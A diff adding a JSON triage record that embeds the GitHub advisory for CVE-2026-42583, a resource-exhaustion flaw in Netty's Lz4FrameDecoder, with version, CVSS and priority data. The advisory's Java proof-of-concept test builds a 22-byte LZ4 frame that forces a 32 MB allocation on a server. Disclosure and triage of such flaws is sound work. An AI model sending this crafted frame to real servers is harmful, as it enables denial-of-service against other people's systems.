@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/696661?v=4\", \"events_url\": \"https://api.github.com/users/violetagg/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/violetagg/followers\", \"following_url\": \"https://api.github.com/users/violetagg/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/violetagg/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/violetagg\", \"id\": 696661, \"login\": \"violetagg\", \"node_id\": \"MDQ6VXNlcjY5NjY2MQ==\", \"organizations_url\": \"https://api.github.com/users/violetagg/orgs\", \"received_events_url\": \"https://api.github.com/users/violetagg/received_events\", \"repos_url\": \"https://api.github.com/users/violetagg/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/violetagg/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/violetagg/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/violetagg\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42583\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}, {\"cwe_id\": \"CWE-770\", \"name\": \"Allocation of Resources Without Limits or Throttling\"}], \"description\": \"### Summary\\nLz4FrameDecoder allocates a ByteBuf of size `decompressedLength` (up to 32 MB per block) before LZ4 runs. A peer only needs a 21-byte header plus `compressedLength` payload bytes - 22 bytes if `compressedLength == 1` - to force that allocation.\\n\\n### Details\\nio.netty.handler.codec.compression.Lz4FrameDecoder#decode\\nHeader fields are trusted for sizing. On the compressed path, after `readableBytes >= compressedLength`, the decoder does `ctx.alloc().buffer(decompressedLength, decompressedLength)` then decompresses.\\n\\n### PoC\\nThe test below demonstrates how an attacker sending 22 bytes will force the server to allocate 32MB\\n\\n```java\\n    @Test\\n    void test() throws Exception {\\n        EventLoopGroup workerGroup = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());\\n        try {\\n            AtomicReference<Throwable> serverError = new AtomicReference<>();\\n            CountDownLatch latch = new CountDownLatch(1);\\n\\n            ServerBootstrap server = new ServerBootstrap()\\n                    .group(workerGroup)\\n                    .channel(NioServerSocketChannel.class)\\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\\n                        @Override\\n                        protected void initChannel(SocketChannel ch) {\\n                            ch.pipeline()\\n                                    .addLast(new Lz4FrameDecoder())\\n                                    .addLast(new ChannelInboundHandlerAdapter() {\\n                                        @Override\\n                                        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\\n                                            if (cause instanceof DecoderException) {\\n                                                serverError.set(cause.getCause());\\n                                            } else {\\n                                                serverError.set(cause);\\n                                            }\\n                                            latch.countDown();\\n                                        }\\n                                    });\\n                        }\\n                    });\\n\\n            ChannelFuture serverChannel = server.bind(0).sync();\\n\\n            Bootstrap client = new Bootstrap()\\n                    .group(workerGroup)\\n                    .channel(NioSocketChannel.class)\\n                    .handler(new ChannelInboundHandlerAdapter() {\\n                        @Override\\n                        public void channelActive(ChannelHandlerContext ctx) {\\n                            ByteBuf buf = ctx.alloc().buffer(22, 22);\\n                            buf.writeLong(MAGIC_NUMBER);\\n                            buf.writeByte(BLOCK_TYPE_COMPRESSED | 0x0F);\\n                            buf.writeIntLE(1);\\n                            buf.writeIntLE(1 << 25);\\n                            buf.writeIntLE(0);\\n                            buf.writeByte(0);\\n\\n                            ctx.writeAndFlush(buf);\\n\\n                            ctx.fireChannelActive();\\n                        }\\n                    });\\n\\n            ChannelFuture clientChannel = client.connect(serverChannel.channel().localAddress()).sync();\\n\\n            assertTrue(latch.await(10, TimeUnit.SECONDS));\\n\\n            assertInstanceOf(IndexOutOfBoundsException.class, serverError.get());\\n\\n            clientChannel.channel().close();\\n            serverChannel.channel().close();\\n        } finally {\\n            workerGroup.shutdownGracefully();\\n        }\\n    }\\n```\\n\\n### Impact\\nUntrusted senders without per-channel / aggregate limits can stress memory with many small requests.\", \"epss\": {\"percentage\": 0.00429, \"percentile\": 0.34548}, \"ghsa_id\": \"GHSA-mj4r-2hfc-f8p6\", \"github_reviewed_at\": \"2026-05-07T00:20:35Z\", \"html_url\": \"https://github.com/advisories/GHSA-mj4r-2hfc-f8p6\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-mj4r-2hfc-f8p6\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42583\"}], \"nvd_published_at\": \"2026-05-13T19:17:23Z\", \"published_at\": \"2026-05-07T00:20:35Z\", \"references\": [\"https://github.com/netty/netty/security/advisories/GHSA-mj4r-2hfc-f8p6\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42583\", \"https://github.com/advisories/GHSA-mj4r-2hfc-f8p6\"], \"repository_advisory_url\": \"https://api.github.com/repos/netty/netty/security-advisories/GHSA-mj4r-2hfc-f8p6\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/netty/netty\", \"summary\": \"Netty Lz4FrameDecoder is vulnerable to resource exhaustion \", \"type\": \"reviewed\", \"updated_at\": \"2026-05-14T20:41:15Z\", \"url\": \"https://api.github.com/advisories/GHSA-mj4r-2hfc-f8p6\", \"vulnerabilities\": [{\"first_patched_version\": \"4.2.13.Final\", \"package\": {\"ecosystem\": \"maven\", \"name\": \"io.netty:netty-codec-compression\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 4.2.12.Final\"}, {\"first_patched_version\": \"4.1.133.Final\", \"package\": {\"ecosystem\": \"maven\", \"name\": \"io.netty:netty-codec\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 4.1.132.Final\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-mj4r-2hfc-f8p6",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "io.netty:netty-codec-compression: <= 4.2.12.Final",
+      "io.netty:netty-codec: <= 4.1.132.Final"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-42583"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "io.netty:netty-codec",
+      "io.netty:netty-codec-compression"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.296172Z",
+  "provenance": {
+    "content_sha256": "444f73cef53a735668d39e6b6e2cd3ef85a0fc62917d4d086b9e9dce0dd89a0b",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-07T00:20:35Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-mj4r-2hfc-f8p6",
+  "status": "active",
+  "title": "Netty Lz4FrameDecoder is vulnerable to resource exhaustion ",
+  "updated_at": "2026-05-14T20:41:15Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-mj4r-2hfc-f8p6"
+}
